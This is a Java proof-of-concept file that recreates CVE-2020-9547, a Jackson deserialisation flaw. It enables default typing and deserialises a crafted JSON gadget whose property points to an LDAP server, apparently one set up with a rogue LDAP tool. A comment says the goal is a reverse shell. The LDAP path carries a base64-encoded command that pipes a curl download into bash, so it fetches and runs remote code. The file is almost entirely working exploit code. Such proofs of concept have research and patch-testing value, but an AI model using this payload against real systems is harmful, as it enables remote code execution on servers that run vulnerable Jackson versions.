package com.anonuser;

import java.io.IOException;

import com.fasterxml.jackson.databind.ObjectMapper;

public class Jackson_CVE_2020_9547 {

    public static void main(String args[]) {


        // Creates a reverse shell on the server running this application
        // I use https://github.com/twelvesec/RogueLDAP to setup the LDAP server

        System.out.println("Recreating CVE-2020-9547");
        ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();

        String json = "[\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\", {\"properties\": {\"UserTransaction\":\"ldap://127.0.0.1:6389/JChjdXJsIDEyNy4wLjAuMTo4MDg1fGJhc2gp\"}}]";
        try {
            mapper.readValue(json, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
    
}
